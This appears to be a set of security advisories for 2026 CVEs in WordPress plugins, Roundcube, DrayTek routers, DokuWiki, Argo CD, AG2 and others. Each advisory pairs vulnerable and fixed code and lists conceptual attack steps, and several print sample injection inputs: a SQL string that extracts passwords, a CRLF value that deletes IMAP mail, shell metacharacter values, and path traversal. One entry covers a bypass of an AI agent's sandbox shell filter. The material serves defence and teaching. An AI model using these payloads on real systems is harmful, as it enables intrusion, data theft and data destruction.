docs.text: VikRentCar from n/a through 1.4.8. Fixed in versions after 1.4.8.

docs.title: Root cause
docs.text: Input is stored without sanitization and rendered without output encoding. Unlike reflected XSS, the payload persists: a single submission can compromise every administrator who opens the bookings page.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

// VULNERABLE - stored raw, rendered raw
save_booking($_POST['notes']);                 // "<script>..." goes into the DB
echo get_booking_notes($id);                   // runs for every admin who views it

// FIXED - sanitize on input, encode on output
save_booking(sanitize_text_field($_POST['notes']));
echo esc_html(get_booking_notes($id));

Stored XSS is the more dangerous flavor: the attacker only needs one submission, and the site then attacks its own admins.

Educational material only. Do not use against systems you do not own or have explicit permission to test.

docs.title: Mitigation
docs.text: Update VikRentCar past 1.4.8. After updating, review stored bookings/listings for suspicious script content and force admin password resets if exploitation is suspected.

docs.title: CVE-2026-112860 — Participants Database: Blind SQL Injection
docs.text: Field Value Severity Critical — CVSS 9.3 (v3.1) Product Participants Database — WordPress plugin by xnau webdesign (signup and member record management) Type Improper neutralization of SQL elements (CWE-89) — blind SQL injection Vector Unauthenticated attacker sends a crafted request → user input is concatenated into a SQL query → the database executes the injected SQL → data is exfiltrated through boolean/timing inference

docs.title: Affected versions
docs.text: Participants Database from n/a through 2.7.8.5. Fixed in versions after 2.7.8.5.

docs.title: Root cause
docs.text: A query builder in the plugin interpolates request parameters directly into SQL. The database treats attacker input as part of the command, so injected conditions execute. The blind variant leaks data without error messages, one true/false answer at a time.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

// VULNERABLE - request parameter glued into SQL
$list = $db->get_results("SELECT * FROM participants WHERE list_id = " . $_GET['id']);
// attacker sends: 1 AND SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1)='a' --

// FIXED - parameterized
$list = $db->get_results($db->prepare("SELECT * FROM participants WHERE list_id = %d", $id));

Repeated requests with slightly different conditions reconstruct secrets character by character, even though the page never shows an error.

Educational material only. Do not use against systems you do not own or have explicit permission to test.

docs.title: Mitigation
docs.text: Update Participants Database past 2.7.8.5 immediately. This plugin carries two critical flaws disclosed together (this SQL injection and CVE-2026-112862 object injection) - patching covers both. Rotate database credentials and admin passwords.

docs.title: CVE-2026-112862 — Participants Database: PHP Object Injection via Deserialization
docs.text: Field Value Severity Critical — CVSS 9.8 (v3.1) Product Participants Database — WordPress plugin by xnau webdesign (signup and member record management) Type Deserialization of untrusted data (CWE-502) — PHP object injection Vector Attacker submits a request carrying a crafted serialized PHP payload → the plugin unserializes attacker-controlled data → magic methods (__wakeup/__destruct) of gadget classes execute → attacker reaches code execution or full site control

docs.title: Affected versions
docs.text: Participants Database from n/a through 2.7.8.5. Fixed in versions after 2.7.8.5.

docs.title: Root cause
docs.text: The plugin passes user-influenced data to PHP's unserialize() without integrity checks. PHP object injection lets an attacker instantiate arbitrary classes present in the application; when those classes define magic methods, deserialization alone triggers attacker-chosen behavior - a classic path to remote code execution.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

// VULNERABLE - untrusted bytes become live objects
$record = unserialize($_POST['record']);   // attacker controls this string

// FIXED - never unserialize untrusted input; use JSON with a schema
$record = json_decode($_POST['record'], true);
if (!is_valid_record($record)) { reject(); }

A crafted payload names a gadget class shipped with WordPress or another plugin; its __destruct() runs attacker-chosen operations the moment PHP cleans up the object.

Educational material only. Do not use against systems you do not own or have explicit permission to test.

docs.title: Mitigation
docs.text: Update Participants Database past 2.7.8.5 immediately. Audit for unknown admin accounts and recently modified files, since object injection can lead to silent code execution.

docs.title: CVE-2026-112892 - Pillow: Decompression Bomb
docs.text: Field Value Severity High - CVSS 8.7 Product Pillow 4.1.0 through 12.x (Python imaging library) Type Decompression Bomb (CWE-409) Vector Tiny crafted MSP image

docs.title: Affected versions
docs.text: Pillow 4.1.0 through 12.x (fixed in 13.0.0).

docs.title: Root cause
docs.text: The MSP RLE decoder expanded a small file into an unbounded amount of memory. A few-kilobyte upload could exhaust server RAM - the classic decompression bomb.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. Attacker uploads a tiny MSP file with huge RLE run lengths.
  2. The decoder expands it without a sane cap.
  3. Memory is exhausted; the service goes down.

The accompanying poc.py demonstrates the pattern safely: a vulnerable mock versus the fixed pattern. Fully offline, synthetic data - no exploit, no network calls.

docs.title: Mitigation
docs.text: Upgrade Pillow to 13.0.0 or later (pip install -U pillow). Pin image-processing dependencies in lockfiles. Treat every decoded image as untrusted input: enforce size/dimension limits, run parsing in a sandboxed worker, and never pass user-controlled filenames to external helpers.

docs.title: CVE-2026-112904 — Path Traversal in Vvveb CMS Backup Controller
docs.text: Severity HIGH — CVSS 8.7 Product Vvveb CMS Affected versions 1.0.8.6 and prior Weakness CWE-26 — Path traversal through inconsistent filename sanitization Attack vector Authenticated admin over HTTP

docs.title: Affected versions
docs.text: Vvveb CMS 1.0.8.6 and all earlier versions. Fixed in the patch commit aa29cb0 that adds filename sanitization to the affected functions.

docs.title: Root cause
docs.text: Two functions in the backup controller — the restore-next and backup-next handlers — concatenate the user-supplied file GET parameter directly onto the backup directory path (DIR_BACKUP) without passing it through the sanitizeFileName() helper. Three sibling functions in the same file (restore(), delete(), download()) do sanitize the filename, so this is a single missed sanitization call: the backup-folder boundary simply stops existing for those two endpoints.

docs.title: Proof of concept (conceptual)
docs.text:
1. Log in to the Vvveb admin panel.
  2. Request the backup/restore endpoint with a file parameter containing ../ sequences.
  3. The controller joins DIR_BACKUP + file with no cleaning, so the resulting path climbs out of the backup directory.
  4. On the restore path the server reads the target file; on the backup path the server writes SQL dump content to the attacker-chosen location.

Illustrative vulnerable-vs-fixed pattern (PHP, educational pseudocode — not a working exploit):

// VULNERABLE: filename used raw
$path = DIR_BACKUP . $_GET['file'];          // "../../etc/..." escapes the folder
file_put_contents($path, $sqlDump);

// FIXED: filename sanitized first
$path = DIR_BACKUP . sanitizeFileName($_GET['file']);  // confined to the folder
file_put_contents($path, $sqlDump);

docs.title: Mitigation
docs.text:
• Upgrade past Vvveb CMS 1.0.8.6, or apply the official patch commit aa29cb0 which adds sanitizeFileName() to both functions.
  • Keep admin accounts to the minimum number of trusted users and rotate any secrets that may have been exposed.
  • Audit every endpoint that touches the filesystem for raw filename concatenation.

docs.title: CVE-2026-113351 — libexpat: XML_ParserReset Poisons the Parser (DoS)
docs.text: Field Value Severity High — CVSS 8.2 Product libexpat 2.7.2 through 2.9.0 — the C XML parser embedded in Python, browsers, phones, servers, and appliances worldwide Type Denial of Service: inconsistent memory accounting across XML_ParserReset Vector Remote — one crafted large XML document fed to a long-lived, reset parser poisons it; all subsequent documents fail with XML_ERROR_NO_MEMORY

docs.title: Affected versions
docs.text:
• libexpat 2.7.2 through 2.9.0.
  • Fixed in the release after 2.9.0; rebuild statically linked and bundled copies too.

docs.title: Root cause
docs.text:
XML_ParserReset zeroes the direct byte count but never offsets the tracked heap allocations. The parser keeps two ledgers — bytes seen and heap tracked — and the reset clears one while forgetting the other. From that moment the accounting drifts, and eventually every parse fails with XML_ERROR_NO_MEMORY:

# Simplified vulnerable pattern
class Parser:
    def reset(self):
        self.byte_count = 0          # wiped clean
        # self.tracked_allocs += ???  <- never offset!

class ParserFixed:
    def reset(self):
        self.byte_count = 0
        self.tracked_allocs = 0      # both ledgers start fresh together

One big document allocates large chunks; the app resets the parser for reuse; the ledger gap stays open forever; every later document — innocent or not — dies on the memory check.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker submits one large crafted XML document to an app using a long-lived libexpat parser.
  2. The parser allocates large heap chunks, tracked in its internal accounting.
  3. The app calls XML_ParserReset to reuse the parser for the next document.
  4. The byte counter zeroes; the tracked allocations are never offset.
  5. Every subsequent document fails with XML_ERROR_NO_MEMORY until the parser is destroyed and recreated — persistent denial of service.

The accompanying poc.py demonstrates the pattern safely: a two-ledger accounting model where reset clears only one ledger versus one that resets both — purely synthetic, offline, no exploit.

docs.title: Mitigation
docs.text:
• Update now: libexpat past 2.9.0 via your OS package manager.
  • Inventory bundled copies: statically linked or vendored expat does not heal itself — rebuild every artifact that embeds it.
  • Don't reuse reset parsers on untrusted input until patched; recreating the parser clears the poisoned state.

docs.title: CVE-2026-113356 — DokuWiki: Draft Race + unserialize() = PHP Object Injection
docs.text: Field Value Severity High — CVSS 7.7 Product DokuWiki before 2026-07-14c — the popular open-source, database-free PHP wiki Type PHP Object Injection via insecure deserialization (CWE-502), delivered through a draft-file race Vector Authenticated user with edit rights → races concurrent draft rewrites → splices serialized payload → Draft::getDraftText() calls unserialize() without class restrictions → gadget instantiation (MemoryIndex, Installer) → arbitrary file write/delete, code execution

docs.title: Affected versions
docs.text:
• All DokuWiki versions before 2026-07-14c.
  • Fixed in release 2026-07-14c.

docs.title: Root cause
docs.text:
Draft::getDraftText() reads the draft file from disk and passes its contents straight into PHP's unserialize() with no allowed_classes restriction. unserialize() turns text into living objects — constructors and destructors fire on birth and death — so attacker-shaped text builds attacker-shaped weapons. A race in concurrent draft rewrites lets the payload be spliced into the draft file mid-save:

# Simplified vulnerable pattern (PHP shown as pseudocode)
text = file_get_contents(draft_file)   # attacker spliced payload via race
unserialize(text)                      # no allowed_classes -> any object!

# Simplified fixed pattern
unserialize(text, ["allowed_classes" => ["SafeDraft"]])  # only known-safe classes

Gadget classes like MemoryIndex and Installer then provide the primitives: arbitrary file write, file deletion, and finally code execution.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker authenticates with an account that has wiki edit rights.
  2. They trigger concurrent draft rewrites, racing the server's own save, and splice a crafted serialized payload into the draft file.
  3. The server reads the draft back via Draft::getDraftText().
  4. unserialize() instantiates the gadget chain (e.g. MemoryIndex, Installer) without class restrictions.
  5. Gadgets perform arbitrary file writes/deletion and escalate to code execution on the wiki server.

The accompanying poc.py demonstrates the pattern safely: deserializing attacker-influenced data into unrestricted object types versus a strict allowlist — purely synthetic, offline, no exploit.

docs.text:
• Upgrade now: DokuWiki 2026-07-14c or later closes the injection.
  • Limit edit rights to people you trust until patched.
  • Back up the data directory regularly and monitor draft files for anomalies.

docs.title: CVE-2026-113380 — RingRTC (Signal): Flooded Call Event Queue Blocks Local Hang-Up
docs.text: Field Value Severity Critical — CVSS 9.3 Product RingRTC (Signal's calling library), before 2.72.0 — the library behind Signal voice and video calls Type Improper check for unusual or exceptional conditions (CWE-754) Vector Remote — a call peer floods the call's FSM event queue so a local hang-up event is never processed; the call's audio (and possibly video) track stays alive after the user hangs up

docs.title: Affected versions
docs.text: • RingRTC before 2.72.0. That covers every Signal client embedding an older RingRTC build — Android, iOS, and Desktop — until the client ships the fixed library.

docs.title: Root cause
docs.text:
A local hang-up is not a kill switch: it is just one more event placed at the back of the call's finite-state-machine event queue. The remote peer is trusted with that queue — there is no rate limit on peer-originated events and no priority lane for hang-up. Flood the queue with junk and the hang-up waits behind attacker noise forever, so the call (microphone, possibly camera) is never torn down.

# Simplified vulnerable pattern
def enqueue(event):
    call_fsm.queue.append(event)          # no flood guard, no priority

peer.flood(call_fsm.queue)                # junk events pile up...
enqueue("hangup")                         # ...so hang-up sits at the back
call_fsm.drain()                          # processes junk first — hang-up never runs

# Simplified fixed pattern
def enqueue_fixed(event):
    if event == "hangup":
        call_fsm.queue.appendleft(event)  # critical events jump the queue
    elif peer_rate_ok():
        call_fsm.queue.append(event)      # peer events rate-limited

docs.title: Proof of concept (conceptual)
docs.text:
1. The attacker starts a normal Signal call with the victim.
  2. From their side they saturate the call's FSM event queue with junk events.
  3. The victim taps hang-up; the event lands at the back of a full queue and is never processed.
  4. The call's audio track — and possibly the video track — keeps flowing to the attacker while the victim believes the call ended.

The accompanying poc.py demonstrates the pattern safely: a queue model where a flood buries a hang-up event versus a model where hang-up always jumps the queue. Purely synthetic, offline, no network, no real calls — no exploit.

docs.title: Mitigation
docs.text:
• Update now: RingRTC 2.72.0 or later fixes the queue handling; on the Signal app, install the latest update from your app store.
  • Verify calls end: after hanging up, double-check the call indicator is gone before discussing anything sensitive.
  • For developers: critical control events must never share a queue with untrusted input — give them a priority lane and rate-limit peer-originated events.

docs.title: CVE-2026-113386 — Roundcube Webmail: IMAP Command Injection via _uid
docs.text: Field Value Severity High — CVSS 7.1 Product Roundcube Webmail before 1.6.20, and 1.7.x before 1.7.5 Type CRLF / IMAP command injection (CWE-93) Vector Remote, authenticated — CRLF sequences injected into the _uid parameter of the mail/headers and mail/viewsource actions let an attacker execute arbitrary IMAP commands against the mail server

docs.title: Affected versions
docs.text:
• Roundcube Webmail before 1.6.20
  • Roundcube Webmail 1.7.x before 1.7.5
  • Fixed in 1.6.20 and 1.7.5.

docs.title: Root cause
docs.text:
The _uid request parameter — which should be a simple message number — is spliced directly into the IMAP commands Roundcube sends to the mail server, with no stripping of carriage-return or line-feed characters. IMAP is a line-based protocol: a line break means "this command is done, here comes the next one." So one crafted _uid value becomes several commands, and the mail server cannot tell which part came from the application and which came from the attacker.

# Simplified vulnerable pattern
uid = request["_uid"]                        # e.g. '12\r\nA003 DELETE 1:*'
imap.send(f"A001 FETCH {uid} BODY[]")        # raw!
# server sees:  A001 FETCH 12 BODY[]
#               A003 DELETE 1:*     <-- attacker command runs too

# Simplified fixed pattern
uid = request["_uid"]
assert uid.isdigit()                         # strict validation: numbers only
uid = uid.replace("\r", "").replace("\n", "")# defense in depth: strip CR/LF
imap.send(f"A001 FETCH {uid} BODY[]")

docs.title: Proof of concept (conceptual)
docs.text:
1. The attacker logs in to Roundcube with any valid account.
  2. They open the mail/headers or mail/viewsource action with a _uid value containing CRLF sequences followed by extra IMAP commands.
  3. Roundcube interpolates the value into its IMAP traffic; the server splits the input at the line breaks and runs the attacker's commands.
  4. From one low-privilege webmail account the attacker can read, copy, and delete messages and manipulate mailboxes server-wide.

The accompanying poc.py demonstrates the pattern safely: it builds the IMAP command string from a raw _uid (showing how CRLF splits it into extra commands) versus a strictly validated one. Pure string manipulation — no network, no mail server, no exploit.

docs.title: Mitigation
docs.text:
• Update Roundcube now: to 1.6.20 (1.6 branch) or 1.7.5 (1.7 branch) or later.
  • Validate and sanitize: message IDs must be digits only; strip \r and \n from every user-controlled value that reaches the mail server.
  • Harden deployments: restrict webmail access, review logs for IMAP anomalies, and keep Roundcube on a supported branch.

docs.title: Ortto for WordPress: Missing Authentication Lets Anyone Rewrite Plugin Settings
docs.text:
Educational material only. Do not use against systems you do not own or have explicit permission to test.

Field Value CVE CVE-2026-113387 Severity High - CVSS 3.1 8.6 Product Ortto plugin for WordPress before 1.0.25 Type Missing authentication for critical function (CWE-306) Vector Network, low complexity, no privileges required, no user interaction (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L)

docs.title: Affected versions
docs.text: Ortto for WordPress before 1.0.25. Update to 1.0.25 or later.

docs.title: Root cause
docs.text:
Configuration update requests were not authenticated. The plugin relied only on a secret value, and that secret was exposed in the public HTML of the site. Anyone who could view the page source could read the secret and pass the only check guarding the settings endpoint, so the check protected nothing at all:

# Simplified vulnerable pattern
def update_config(supplied_secret, new_settings):
    if supplied_secret == PUBLIC_SECRET:  # BUG: secret is in public HTML
        save_settings(new_settings)      # no login ever checked

# Simplified fixed pattern
def update_config_fixed(user, supplied_secret, new_settings):
    if not user.is_authenticated():
        return deny("login required")
    if not secrets_match(supplied_secret, server_side_secret()):
        return deny("invalid secret")
    save_settings(new_settings)

A secret that everyone can read is not a secret, and it is not authentication.

docs.title: Proof of concept
docs.text:
Educational, conceptual demo only - it models the vulnerable pattern with synthetic, offline objects. It is not a working exploit and cannot be aimed at real systems.

  1. The attacker opens a public page of the WordPress site and reads the exposed secret from the page source.
  2. The attacker sends a configuration update carrying that secret, with no login and no session.
  3. The plugin accepts the update and overwrites its configuration.
  4. From then on, the site serves the attacker's scripts to every visitor.

The demo in poc.py shows a public secret passing the vulnerable check and a login-plus-server-side-secret check stopping the same request.

docs.title: Mitigation
docs.text:
• Update now: Ortto for WordPress to 1.0.25 or later.
  • Review plugin settings for changes you did not make.
  • Rotate any exposed secrets used by the plugin.
  • Scan site pages for injected scripts served to visitors.
  • Audit access and confirm no unexpected admin or plugin changes.

docs.title: DrayTek Vigor2960: Command Injection Trio in the CGI Interface (CVE-2026-113389, CVE-2026-113390, CVE-2026-113391)
docs.text: Field Value Severity Critical — CVSS 9.9 (v3.1) Product DrayTek Vigor2960 (firmware 1.5.1.6 Revision 8218) firewall/VPN router Type Improper neutralization of special elements used in a command (CWE-74) — OS command injection in the CGI handler Vector Authenticated remote attacker crafts a request to /cgi-bin/mainfunction.cgi where the sectiontype argument (set_table function) is glued into a shell command → root command execution. Two sibling flaws, CVE-2026-113390 and CVE-2026-113391, inject through other CGI functions.

docs.title: Affected versions
docs.text: Vigor2960 1.5.1.6 Revision 8218. Fixed in 1.5.1.7. Note: the vendor marks the 2960 end of support — plan a replacement.

docs.title: Root cause
docs.text:
In mainfunction.cgi, three functions paste request arguments straight into shell command strings with no sanitizing. set_table takes the sectiontype argument; sub_182B0 (jsonstatus) takes usefile/usescript /option; uploadlangs takes the upload filename. A ; or $() in the value becomes a second command:

# Simplified vulnerable pattern
def set_table(sectiontype):
    os.system("set_table.sh " + sectiontype)   # attacker: "x; id > /tmp/p"

# Simplified fixed pattern
ALLOWED = {"lan", "wan", "vpn"}
def set_table_fixed(sectiontype):
    if sectiontype not in ALLOWED:
        raise ValueError("rejected")
    subprocess.run(["set_table.sh", sectiontype], shell=False)
All three exploits are public. Any valid login is enough.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker logs in with any valid account and crafts a request to /cgi-bin/mainfunction.cgi with a shell metacharacter hidden in sectiontype (CVE-2026-113389), usefile/usescript/option (CVE-2026-113390), or the upload filename (CVE-2026-113391).
  2. The CGI handler glues the value into a shell command and executes it as root.
  3. The attacker owns the VPN gateway: reads internal traffic, pivots into the LAN, harvests VPN credentials.

The accompanying poc.py demonstrates the pattern safely: Request parameters are data, never shell syntax: allowlist values and pass them as argument lists. Offline, no server, no exploit.

docs.title: Mitigation
docs.text:
• Update now: Vigor2960 to firmware 1.5.1.7.
  • The 2960 is end of support — plan a hardware replacement, not just a patch.
  • Restrict admin UI access to trusted networks; monitor CGI logs for metacharacters.

docs.title: DrayTek Vigor2960: OS Command Injection via jsonstatus Arguments (covered in the DrayTek trio video)
docs.text: Field Value Severity Critical — CVSS 9.9 (v3.1) Product DrayTek Vigor2960 (firmware 1.5.1.6 Revision 8218) firewall/VPN router Type OS command injection (CWE-77) in the CGI jsonstatus handler Vector Authenticated remote attacker manipulates usefile/usescript/option arguments of the sub_182B0 function in /cgi-bin/mainfunction.cgi → command injection → root execution and file clobbering

docs.title: Affected versions
docs.text: Vigor2960 1.5.1.6 Revision 8218. Fixed in 1.5.1.7 (device is end of support).

docs.title: Root cause
docs.text:
The sub_182B0 function behind the jsonstatus CGI endpoint interpolates the usefile, usescript, and option arguments into shell commands and file paths. Beyond command execution, crafted values also clobber arbitrary files. The fix is identical to its siblings: never build shell strings from request input, and never let filenames leave their intended directory:

# Simplified vulnerable pattern
def jsonstatus(usefile):
    os.system("status " + usefile + " > /tmp/out")  # injection + clobber

# Simplified fixed pattern
def jsonstatus_fixed(usefile):
    if not re.fullmatch(r"[A-Za-z0-9_.-]+", usefile):
        raise ValueError("rejected")
    subprocess.run(["status", usefile], shell=False, stdout=open("/tmp/out","w"))
Covered in the same explainer video as CVE-2026-113389 and CVE-2026-113391; the runnable vulnerable/fixed demo lives in the CVE-2026-113389 folder.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker with any valid login crafts usefile/usescript/option values containing shell metacharacters.
  2. The CGI handler executes them as root — and file-writing variants clobber device files.
  3. Full gateway compromise, same as the sibling CVEs.

The accompanying poc.py demonstrates the pattern safely: Constrain every request value to a safe charset and execute commands without a shell. Offline, no server, no exploit.

docs.title: DrayTek Vigor2960: Command Injection via the Upload Filename (covered in the DrayTek trio video)
docs.text: Field Value Severity Critical — CVSS 9.9 (v3.1) Product DrayTek Vigor2960 (firmware 1.5.1.6 Revision 8218) firewall/VPN router Type Improper neutralization of special elements used in a command (CWE-74) — OS command injection in the upload endpoint Vector Authenticated remote attacker uploads through uploadlangs in /cgi-bin/mainfunction.cgi with a crafted filename → filename interpolated into a shell command → root command execution

docs.title: Affected versions
docs.text: Vigor2960 1.5.1.6 Revision 8218. Fixed in 1.5.1.7 (device is end of support).

docs.title: Root cause
docs.text:
The uploadlangs upload endpoint takes the uploaded file's name and interpolates it into a shell command — filenames are attacker input, and this one becomes syntax:

# Simplified vulnerable pattern
def uploadlangs(filename, data):
    save(data, "/tmp/" + filename)
    os.system("process_lang /tmp/" + filename)   # filename becomes shell

# Simplified fixed pattern
def uploadlangs_fixed(filename, data):
    name = os.path.basename(filename)
    if not re.fullmatch(r"[A-Za-z0-9_.-]+\.[a-z]+", name):
        raise ValueError("rejected")
    path = os.path.join("/tmp/langs", name)
    save(data, path)
    subprocess.run(["process_lang", path], shell=False)
Covered in the same explainer video as CVE-2026-113389 and CVE-2026-113390; the runnable vulnerable/fixed demo lives in the CVE-2026-113389 folder.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker with any valid login uploads a file whose name hides shell metacharacters.
  2. uploadlangs interpolates the name into a shell command executed as root.
  3. Full gateway compromise, same as the sibling CVEs.

The accompanying poc.py demonstrates the pattern safely: Filenames are attacker input: normalize, allowlist, confine the path, and never shell out with them. Offline, no server, no exploit.

docs.title: CVE-2026-113616 — WordPress LogixFast Auth: Password-Reset Codes Mailed to the Attacker
docs.text: Field Value Severity Critical — CVSS 9.8 Product WordPress plugin LogixFast Auth — login and authentication features Type Broken authentication / improper verification (CWE-269) — reset code delivered to a requester-supplied address Vector Unauthenticated attacker requests a password reset for any account → plugin mails the one-time code to the address in the request (the attacker's) → attacker resets the password and takes over the account, including admin

docs.title: Affected versions
docs.text: LogixFast Auth before 1.0.4. Fixed in 1.0.4.

docs.title: Root cause
docs.text:
The reset flow trusts request data for a security-critical decision: where to send the code. The code must always go to the address already on file for the account, never to an address supplied in the reset request:

# Simplified vulnerable pattern
def request_reset(username, supplied_email):
    code = make_code()
    send_email(supplied_email, code)  # BUG: attacker chooses inbox

# Simplified fixed pattern
def request_reset_fixed(username, supplied_email):
    account = find_user(username)
    code = make_code()
    send_email(account.email_on_file, code)  # owner only
Any value that decides who receives a credential must come from the stored account record, not from the incoming request.

docs.title: Proof of concept
docs.text:
1. Attacker requests a password reset for the administrator account.
  2. The plugin mails the one-time code to the attacker's own address.
  3. The attacker enters the code and sets a new admin password.
  4. The attacker logs in as admin; the real owner is locked out.

See poc.py for a safe, offline demo of codes following the request instead of the account: the demo contrasts mailing to a supplied address with mailing to the address on file.

docs.title: Mitigation
docs.text:
• Update now: LogixFast Auth 1.0.4 or later.
  • Force password resets for all admin accounts.
  • Review admin login activity for unknown sessions.
  • Enable two-factor authentication on administrator accounts.

docs.title: CVE-2026-113617 — WordPress Automated Import Products to Cart: Subscriber Arbitrary File Read and Delete
docs.text: Field Value Severity Critical — CVSS 9.9 Product WordPress plugin Automated Import Products to Cart — imports products into the cart Type Path traversal / improper limitation of a pathname (CWE-22) — user-supplied file path used without sanitization Vector Low-privileged user (subscriber) supplies a crafted file path → plugin reads and deletes arbitrary files on the server → database credentials exposed, files destroyed

docs.title: Affected versions
docs.text: Automated Import Products to Cart before 1.0.4. Fixed in 1.0.4.

docs.title: Root cause
docs.text:
The plugin takes a file path from the user and passes it straight to file operations. Without normalization and a containment check, a path containing parent-directory segments escapes the intended folder:

# Simplified vulnerable pattern
def handle_file(user_path):
    data = read_file(user_path)   # BUG: any path accepted
    delete_file(user_path)
    return data

# Simplified fixed pattern
def handle_file_fixed(user_path):
    safe = resolve_inside(BASE_DIR, user_path)  # rejects escapes
    return read_file(safe)
User input must never become a raw filesystem path: resolve it, then prove it still sits inside the one approved directory.

docs.title: Proof of concept
docs.text:
1. A subscriber account sends a crafted path that climbs out of the uploads folder.
  2. The plugin reads the site configuration file, exposing database credentials.
  3. The same flaw lets the subscriber delete arbitrary files on the server.
  4. With the database password, the attacker can read or alter store data.

See poc.py for a safe, offline demo of unvalidated paths: the demo contrasts reading any path the user names with resolving paths inside one approved folder only.

docs.title: Mitigation
docs.text:
• Update now: Automated Import Products to Cart 1.0.4 or later.
  • Rotate database credentials if the site ran a vulnerable version.
  • Review subscriber accounts for suspicious activity.
  • Back up before patching, and restrict file operations to an allow-listed directory.

docs.title: CVE-2026-113663: AG2 Sandbox Shell Filter Bypass (Command Injection)
docs.text: Field Value Severity HIGH (8.8) CVSS vector CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H Product AG2 AgentOS (ag2), AutoGen (autogen) Vulnerability type Improper Neutralization of Special Elements used in a Command (CWE-78)

docs.title: Affected versions
docs.text:
• ag2 from 0.13.2 until 1.1.1 (fixed in ag2 1.1.1)
  • autogen from 0.13.2 to 0.14.1 (fixed in autogen 0.14.1)

docs.title: Root cause
docs.text: SandboxShellTool configurations using an allowlist (allowed=[...]) or readonly=True rely on a filter that validates the command prefix and rejects selected shell syntax. The filter omits newline and carriage-return separators, while the accepted raw string is passed to the system shell. An attacker-influenced agent command can therefore smuggle an additional arbitrary statement behind an allowed prefix. With the default LocalEnvironment backend, the injected statement runs as a host subprocess with the privileges of the agent process.

docs.title: Proof of concept
docs.text:
The demo in poc.py models the safe pattern: a command validator that rejects newline and carriage-return separators (and other shell operators) anywhere in the command string before it is accepted, and only allows commands whose full text matches the allowlist. It never executes a shell command.

See poc.py in this folder. Educational only: the demo illustrates the vulnerable pattern's safe counterpart and performs no exploitation. Only test in controlled environments against systems you own or are authorized to test.

docs.title: Mitigation
docs.text:
• Update AG2 to 1.1.1 or AutoGen to 0.14.1 immediately.
  • Run agents with least privilege, and prefer a real container or virtual machine over the local shell backend for anything untrusted.
  • Audit agent-issued commands and restrict which tools can reach a shell at all.
  • Treat any agent input that can influence shell commands as untrusted.

docs.title: Argo CD: Jsonnet Imports Escape the Repo and Leak Cluster Secrets (covered in the Argo CD triple-flaw video)
docs.text: Field Value Severity Critical — CVSS 9.9 (v3.1) Product Argo CD 0.9.0 – 3.6.0-rc2 (GitOps continuous delivery for Kubernetes) Type Path traversal (CWE-22) — Jsonnet importer not confined to repository root Vector Attacker commits a .jsonnet file using absolute paths / .. traversal / symlinks in import/importstr/importbin → repo-server reads any readable file (service-account tokens, /proc/self/environ, private keys) → contents returned to caller via a ConfigMap; importstr on /dev/zero exhausts memory

docs.title: Affected versions
docs.text: Argo CD 0.9.0 through 3.6.0-rc2. Fixed in 3.3.15, 3.4.10, 3.5.4, 3.6.0-rc2. Directory Applications evaluate every .jsonnet file in the application directory.

docs.title: Root cause
docs.text:
The repo-server evaluates .jsonnet files with an importer that never confines import, importstr, or importbin to the repository root. Absolute paths, parent-directory traversal, and repository symlinks open any file the repo-server can read — projected service-account tokens, mounted private keys, repository credentials, /proc/self/environ. Generated Secrets are redacted, but placing the imported contents in a ConfigMap returns the data to the caller; importstr on /dev/zero exhausts repo-server memory:

# Simplified vulnerable pattern
def import_file(path):
    return open(path).read()          # any path the process can read

# Simplified fixed pattern
def import_file_fixed(path):
    resolved = resolve(REPO_ROOT, path)
    if not inside(REPO_ROOT, resolved):
        raise ValueError("import escapes repository root")
    return open(resolved).read()
The same repo-server delivery story as CVE-2026-113709 and CVE-2026-113708 — one explainer video covers all three; the vulnerable/fixed poc.py pattern lives in the CVE-2026-113709 folder.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker commits a .jsonnet file with absolute-path or .. imports, or uploads it via POST /api/v1/applications/manifestsWithFiles (only Application get permission on a directory Application needed).
  2. The repo-server evaluates it and reads cluster secrets into the rendered output.
  3. Placing the content in a ConfigMap returns it to the caller; importstr on a non-terminating device can exhaust memory.

The accompanying poc.py demonstrates the pattern safely: File access must be confined: every import resolves inside the intended root, or it is rejected. Offline, no server, no exploit.

docs.title: Mitigation
docs.text:
• Update now: Argo CD to 3.3.15, 3.4.10, 3.5.4 or newer.
  • Disable built-in tools you do not use (tool detection docs); restrict Application get.
  • Rotate any secrets the repo-server could read.
